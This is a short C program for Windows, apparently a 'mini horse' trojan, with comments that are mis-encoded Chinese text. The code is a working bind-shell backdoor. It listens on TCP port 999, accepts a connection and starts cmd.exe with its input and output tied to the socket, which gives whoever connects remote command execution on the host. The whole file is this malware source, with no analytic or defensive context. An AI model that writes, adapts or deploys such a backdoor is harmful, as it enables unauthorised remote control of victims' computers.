// �򻯵�˫�ܵ�ľ��
// �� stdin, stdout, stderr ȫ���ض��� sock
// �� mini_horse��ԭ��һ��

#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"Ws2_32")
int main()
{
    WSADATA ws;
    SOCKET listenFD;
    int ret;
    //��ʼ��wsa
    WSAStartup(MAKEWORD(2, 2), &ws);
    //ע��Ҫ��WSASocket
    listenFD = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    //��������999�˿�
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(999);
    server.sin_addr.s_addr = ADDR_ANY;
    ret = bind(listenFD, (sockaddr *)&server, sizeof(server));
    ret = listen(listenFD, 2);
    //����ͻ�����999�˿ڣ���������
    int iAddrSize = sizeof(server);
    SOCKET clientFD = accept(listenFD, (sockaddr *)&server, &iAddrSize);
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.wShowWindow = SW_SHOWNORMAL;
    si.hStdInput = si.hStdOutput = si.hStdError = (void *)clientFD; //��д�ܵ�
    char cmdLine[] = "cmd.exe";
    PROCESS_INFORMATION ProcessInformation;
    //��������
    ret = CreateProcess(NULL, cmdLine, NULL, NULL, 1, 0, NULL, NULL, &si, &ProcessInformation);
    return 0;
}
